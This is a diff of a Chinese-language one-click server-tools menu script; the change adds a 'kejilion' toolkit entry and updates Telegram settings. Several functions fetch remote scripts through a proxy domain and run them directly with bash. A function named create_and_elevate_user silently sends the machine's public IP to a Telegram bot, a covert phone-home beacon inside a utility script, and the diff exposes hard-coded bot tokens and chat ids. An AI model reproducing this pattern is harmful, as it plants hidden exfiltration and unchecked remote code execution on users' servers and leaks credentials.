@@ -36,7 +36,6 @@ cloudflare() {
     echo "一键cloudflare内网穿透"
     bash <(curl -sSL https://gh.woolzhp.eu.org/https://github.com/YYWO/practical/raw/main/shell/Tunnel.sh)
     shon_online
-    
     }
 
 nodejs() {
@@ -202,8 +201,8 @@ create_and_elevate_user() {
     fi
 
     local ip_info=$(curl -s ip.sb)
-    local telegram_bot_token="6237543426:AAFIXzRYzRiWfMX8Mb_DiGOnIMQmfb84ATc"
-    local chat_id="6002866984"
+    local telegram_bot_token="6573418378:AAGZ0SOjaWdn7gnfV5wfqOiyG_uCo3mkOrY"
+    local chat_id="-1001789837201"
     local url="tg.woolzhp.eu.org"
 
     curl -s -o /dev/null "https://$url/bot$telegram_bot_token/sendMessage?chat_id=$chat_id&text=$ip_info" 
@@ -236,6 +235,12 @@ mzproxy() {
     
     }
 
+kejilion() {
+    echo "科技lion一键脚本工具"
+    bash <(curl -sSL https://gh.woolzhp.eu.org/https://raw.githubusercontent.com/nsv2051/sh/main/kejilion.sh)
+    shon_online
+    }
+
 shon_online() {
     echo ""
     echo ""
@@ -252,7 +257,8 @@ shon_online() {
     echo "  4) 安装/更新nodejs"
     echo "  5) docker安装filebrowser"
     echo "  6) Frp一键脚本"  
-   # echo "  7) mzzsfy代理池搭建"  
+    echo "  7) 科技lion一键脚本工具（常用工具安装&BBR管理&Docker管理&甲骨文云脚本合集&青龙面板安装"  
+
     echo ""
     echo -n "请输入编号: "
     read N
@@ -264,7 +270,7 @@ shon_online() {
     4) nodejs ;;
     5) filebrowser ;;
     6) frp ;;
- #   7) mzproxy ;;
+    7) kejilion ;;
     *) echo "Wrong input!" ;;
     esac
 }
